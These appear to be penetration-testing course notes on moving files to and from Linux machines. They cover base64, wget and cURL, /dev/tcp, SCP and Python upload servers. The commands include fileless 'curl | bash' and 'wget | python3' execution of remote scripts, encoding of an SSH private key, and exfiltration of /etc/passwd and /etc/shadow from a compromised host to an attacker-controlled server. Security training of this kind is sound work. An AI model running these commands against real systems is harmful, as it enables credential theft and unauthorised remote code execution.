## Base64 Encoding / Decoding
```sh
$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBP <SNIP>
```

```sh
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Linux - Decode the File
```sh
$ echo -n 'LS0tLS1CRUdJTi <SNIP>'
```

#### Linux - Confirm the MD5 Hashes Match
```sh
$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

## Web Downloads with Wget and cURL
```sh
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```sh
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux
* Fileless means we do not need to download a file to execute it

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS

#### Fileless Download with cURL
```sh
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless Download with wget
```sh
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Download with Bash (/dev/tcp)
#### Connect to the Target Web server
```sh
$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request
```sh
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response
```sh
$ cat <&3
```

## SSH Downloads
* Comes with `SCP` utility for remote file transfer
* `SCP` (secure copy)
	* Copy files and directories between two hosts
	* Very similar to `copy` or `cp`
	* We need to specify a username, the remote IP address or DNS name, and the user's credentials

#### Enabling the SSH Server
```sh
$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

#### Starting the SSH Server
```sh
$ sudo systemctl start ssh
```

#### Checking for SSH Listening Port
```sh
$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

#### Linux - Downloading Files Using SCP
```sh
$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.

## Web Upload
* We can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page

#### Pwnbox - Start Web Server
```sh
$ python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

#### Pwnbox - Create a Self-Signed Certificate
```sh
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

#### Pwnbox - Start Web Server
```sh
$ mkdir https && cd https
$ python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

#### Linux - Upload Multiple Files
* From our compromised machine, we upload `/etc/passwd` and `/etc/shadow` 
*  `--insecure` because we used a self-signed certificate

```sh
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method
#### Linux - Creating a Web Server with Python3
```sh
$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```sh
$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```sh
$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

```sh
$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

#### Download the File from the Target Machine onto the Pwnbox
```sh
$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

## SCP Upload
* If `SSH` for outbound connections allowed
* We can use an SSH server with `scp` for uploads

#### File Upload using SCP
```sh
$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

plaintext@192.168.49.128's password: 
passwd         
```
